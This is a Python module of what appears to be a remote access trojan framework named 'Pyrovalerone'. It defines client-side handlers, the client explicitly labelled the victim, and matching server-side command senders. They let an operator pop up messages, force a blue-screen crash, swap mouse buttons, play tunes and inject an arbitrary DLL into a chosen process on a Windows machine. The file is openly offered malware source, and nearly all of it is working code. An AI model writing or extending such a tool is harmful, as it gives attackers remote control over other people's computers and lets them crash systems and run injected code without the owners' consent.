"""
    Pyrovalerone
    Microsoft Windows(R) Module
    Note: Features remote administration logic for Windows OS
"""
import BDModuleDefault
from BDWinRAT import WinRAT

# Modules to be registered at both client-side and server-side
_modules = ["msgbox", "bsod", "swapmouse", "beep", "injectdll", "playtune"]

""""
	@class ClientMain
	@brief The block that will be invoked by the client (victim)
"""
class ClientMain(BDModuleDefault.ClientMain):

	def __init__(self, handler):
		super().__init__(handler)

		# Create new Windows RAT API instance
		self.rat = WinRAT()

		# Extend the default class with the new command modules
		self.registerCMDModules(_modules)

	"""
		@method msgbox
		@brief Displays a popup message on the client machine
		@param {list} argv Arguments array
		@return {str} Status of command exection
	"""
	def msgbox(self, argv):

		# Receive title
		title = self.handler.recv_msg()

		# Receive message
		message = self.handler.recv_msg()

		try:
			self.rat.msgbox(title=title, msg=message)

		except Exception as exc:
			return 'CMD_FAIL: {}'.format(exc)

		return 'CMD_SUCCESS'

	"""
		@method bsod
		@brief Triggers a blue-screen of death on the client machine
		@param {list} argv Arguments array
		@return {str} Status of command execution
	"""
	def bsod(self, argv):
		try:
			self.rat.bsod()
		except Exception as exc:
			return 'CMD_FAIL: {}'.format(exc)

		return 'CMD_SUCCESS'

	"""
		@method swapmouse
		@brief Swaps or restores the mouse buttons
		@param {list} argv Arguments array
		@return {str} Status of command exection
	"""
	def swapmouse(self, argv):
		try:
			if self.handler.recv_msg() == "on":
				self.rat.swapmouse(evil=1)
			else:
				self.rat.swapmouse(evil=0)

		except Exception as exc:
			return 'CMD_FAIL: {}'.format(exc)

		return 'CMD_SUCCESS'

	"""
		@method beep
		@brief Plays a frequency for a given duration
		@param {list} argv Arguments array
		@return {str} Status of command execution
	"""
	def beep(self, argv):
		try:
			freq = int(self.handler.recv_msg())
			duration = int(self.handler.recv_msg())
			self.rat.beep(freq, duration)

		except Exception as exc:
			return 'CMD_FAIL: {}'.format(exc)

		return 'CMD_SUCCESS'

	def playtune(self, argv):
		try:
			notes = self.handler.recv_msg()
			notes = notes.split(" ")

			repeat = int(self.handler.recv_msg())

			for i in range(0, repeat):
				self.rat.playNotes(notes)

		except Exception as exc:
			return 'CMD_FAIL: {}'.format(exc)

		return 'CMD_SUCCESS'

	"""
		@method injectdll
		@brief injects a dynamic library into a running process
		@param {list} argv Arguments array
		@return {str} Status of command execution
	"""
	def injectdll(self, argv):
		try:

			# Get process identifier
			pid = int(self.handler.recv_msg())

			# Get DLL path
			dll = str(self.handler.recv_msg())

			# Attempt injection
			self.rat.injectdll(pid, dll)

		except Exception as exc:
			raise(exc)
			return 'CMD_FAIL: {}'.format(exc)

		return 'CMD_SUCCESS'

class ServerMain(BDModuleDefault.ServerMain):

	def __init__(self, handler):
		super().__init__(handler)
		self.registerCMDModules(_modules)
	"""
		@method msgbox
		@brief displays a modal on the client machine
		@param {list} argv Arguments array
		@return {str} Command execution status as received from client
	"""
	def msgbox(self, argv):

		if len(argv) < 3:
			return b'INVALID_ARGUMENT'

		title = argv[1]
		msg = argv[2]

		# Send title
		self.handler.send_msg(title)

		# Send message
		self.handler.send_msg(msg)

		return self.handler.recv_msg()

	def bsod(self, argv):
		return self.handler.recv_msg()

	def swapmouse(self, argv):
		if len(argv) < 2:
			return b'INVALID_ARGUMENT'

		toggle = argv[1]

		# Send toggle
		self.handler.send_msg(toggle)

		return self.handler.recv_msg()

	def beep(self, argv):
		if len(argv) < 3:
			return b'INVALID_ARGUMENT'

		freq = argv[1]
		duration = argv[2]

		# Send frequency
		self.handler.send_msg(freq)

		# Send duration
		self.handler.send_msg(duration)

		return self.handler.recv_msg()

	def playtune(self, argv):
		if len(argv) < 3:
			return b'INVALID_ARGUMENT'

		notes = argv[1]
		repeat = argv[2]
		if notes == "soviet anthem":
			sovietAnthem =  "C4:4 G3:3 A3:1 B3:4 E3:4 A3:4 G3:3 F3:1 G3:4 C3:2 C3:2 D3:4 D3:2 E3:2 F3:4 "
			sovietAnthem += "F3:2 G3:2 A3:4 B3:2 C4:2 D4:6 G3:2 E4:4 D4:3 C4:1 D4:4 B3:2 G3:2 C4:4 B3:3 "
			sovietAnthem += "A3:1 B3:4 E3:2 E3:2 A3:4 G3:2 F3:2 G3:4 C3:2 C3:2 C4:4 B3:3 A3:1 G3:6 "
			sovietAnthem += ".:4 .:4"
			notes = sovietAnthem

		# Send notes
		self.handler.send_msg(notes)

		# Send repeat count
		self.handler.send_msg(repeat)

		return self.handler.recv_msg()

	def injectdll(self, argv):
		if len(argv) < 3:
			return b'INVALID_ARGUMENT'

		pid = argv[1]
		dll = argv[2]

		# Send process id
		self.handler.send_msg(pid)

		# Send dll path
		self.handler.send_msg(dll)

		return self.handler.recv_msg()